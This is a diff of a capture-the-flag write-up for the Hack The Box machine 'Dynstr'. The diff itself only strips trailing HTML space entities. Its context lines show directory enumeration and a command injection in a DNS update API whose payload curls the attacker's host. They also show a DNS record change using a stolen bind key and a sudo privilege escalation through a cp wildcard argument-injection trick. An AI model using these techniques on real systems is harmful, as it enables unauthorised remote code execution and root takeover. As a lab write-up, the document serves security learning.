@@ -58,7 +58,7 @@ dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.h
 ;; MSG SIZE  rcvd: 11
 ```
 
-There is a `hostmaster` subdomain present, but it loads the same page. I ran a `gobuster`scan on the `hostmaster` subdomain in case it was different.&#x20;
+There is a `hostmaster` subdomain present, but it loads the same page. I ran a `gobuster`scan on the `hostmaster` subdomain in case it was different.
 
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hostmaster.dyna.htb -t 100
@@ -80,7 +80,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /nic                  (Status: 301) [Size: 324] [-> http://hostmaster.dyna.htb/nic/]
 ```
 
-`/nic`? Loading it shows nothing, so let's do another `gobuster` scan.&#x20;
+`/nic`? Loading it shows nothing, so let's do another `gobuster` scan.
 
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hostmaster.dyna.htb/nic -t 100
@@ -112,14 +112,14 @@ Googling `/nic/update` reveals that this is actually an API that we can access:
 
 {% embed url="https://help.dyn.com/remote-access-api/perform-update/" %}
 
-This requires credentials, which we had found earlier, so let's try to use this API.&#x20;
+This requires credentials, which we had found earlier, so let's try to use this API.
 
 ```
 $ curl http://dynadns:sndanyd@dyna.htb/nic/update?hostname=10.10.14.13
 911 [wrngdom: 10.14.13]
 ```
 
-Since this is taking our input and sending it somewhere, I tried some basic RCE injection.&#x20;
+Since this is taking our input and sending it somewhere, I tried some basic RCE injection.
 
 ```
 $ curl -G --data-urlencode 'hostname=10.10.14.13; curl 10.10.14.13/rce' http://dynadns:sndanyd@dyna.htb/nic/update
@@ -192,7 +192,7 @@ from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwS
 ```
 {% endcode %}
 
-The next step here would be to update the DNS records using `nsupdate` such that a new domain would point to our machine and allow us to `ssh` in using the key we found. The hint here is to use `bind`, and this would require a key file from `/etc/bind`.&#x20;
+The next step here would be to update the DNS records using `nsupdate` such that a new domain would point to our machine and allow us to `ssh` in using the key we found. The hint here is to use `bind`, and this would require a key file from `/etc/bind`.
 
 ```
 www-data@dynstr:/etc/bind$ ls
@@ -202,7 +202,7 @@ db.127     ddns.key   named.conf.default-zones  zones.rfc1918
 db.255     infra.key  named.conf.local
 ```
 
-The `infra.key` file is readable by us, so let's use that with the `-k` flag using `nsupdate`. For this particular case, since we are using `ssh`, we want the IP address to be resolvable from the domain name and vice versa. This means that we need to add both a PTR and an A type DNS record within the server. I had to use a writeup for this since I wasn't too familiar with DNS records.&#x20;
+The `infra.key` file is readable by us, so let's use that with the `-k` flag using `nsupdate`. For this particular case, since we are using `ssh`, we want the IP address to be resolvable from the domain name and vice versa. This means that we need to add both a PTR and an A type DNS record within the server. I had to use a writeup for this since I wasn't too familiar with DNS records.
 
 ```
 www-data@dynstr:/etc/bind$ nsupdate -k infra.key 
@@ -300,15 +300,15 @@ else
 fi
 ```
 
-The vulnerability is in the usage of the wildcard.&#x20;
+The vulnerability is in the usage of the wildcard.
 
 ```bash
 cp .version * /etc/bind/named.bindmgr/
 ```
 
-Because this specified a wildcard and we can run it as `root`, this means we can preserve or copy file permissions (like SUID) over to other binaries using the `--preserve=mode` flag.&#x20;
+Because this specified a wildcard and we can run it as `root`, this means we can preserve or copy file permissions (like SUID) over to other binaries using the `--preserve=mode` flag.
 
-First, we need to create a `.version` file with 42 within it because the script checks for the version run. Then, we can create a folder named `--preserve=mode` which abuses the wildcard and makes the file we created a flag.&#x20;
+First, we need to create a `.version` file with 42 within it because the script checks for the version run. Then, we can create a folder named `--preserve=mode` which abuses the wildcard and makes the file we created a flag.
 
 Then, we need to do `cp /bin/bash` to our file, and run the script using `sudo`:
 
